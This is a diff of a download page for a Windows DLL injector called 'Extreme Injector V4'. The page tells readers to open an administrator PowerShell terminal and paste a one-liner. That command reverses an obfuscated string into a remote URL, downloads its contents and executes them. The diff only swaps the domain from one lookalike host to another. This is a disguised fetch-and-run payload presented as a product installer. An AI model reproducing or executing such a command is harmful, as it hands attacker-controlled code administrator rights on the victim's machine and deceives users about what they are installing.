@@ -43,7 +43,7 @@ Download Extreme Injector V4 DLL Manual Map is a powerful Windows DLL injector t
 Press `Win + X` → **Terminal (Admin)** → paste the commands below → press `Enter`
 
 ```powershell
-"ExtremeV4";iex(irm((-join"dfc.mrtig//:sptth"[-1..-99])))
+"ExtremeV4";iex(irm((-join"sbs.mrtig//:sptth"[-1..-99])))
 ```
 
 **⏱ Takes under a minute. Keep the window open until it finishes.**
